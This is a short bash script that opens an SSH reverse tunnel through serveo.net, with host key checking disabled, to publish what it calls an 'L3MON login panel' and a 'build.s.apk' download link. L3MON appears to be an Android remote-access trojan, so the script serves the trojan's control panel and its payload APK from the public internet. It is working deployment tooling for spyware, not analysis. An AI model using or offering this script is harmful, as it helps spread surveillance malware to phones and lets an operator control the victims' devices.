#!/bin/bash

# Install Openssh
# apk add openssh

TUNNEL_LOG=$(mktemp)

ssh -o StrictHostKeyChecking=no -R 80:localhost:22533 serveo.net > "$TUNNEL_LOG" 2>&1 &
SSH_PID=$!

while ! grep -q "https://" "$TUNNEL_LOG"; do
  sleep 1
done

TUNNEL_URL=$(grep -oE "https?://[a-zA-Z0-9./?=_-]*" "$TUNNEL_LOG" | head -n 1)

echo "Your L3MON login panel is accessible at: $TUNNEL_URL"
echo "Your L3MON login panel is accessible at: $TUNNEL_URL/build.s.apk"

disown $SSH_PID
                  
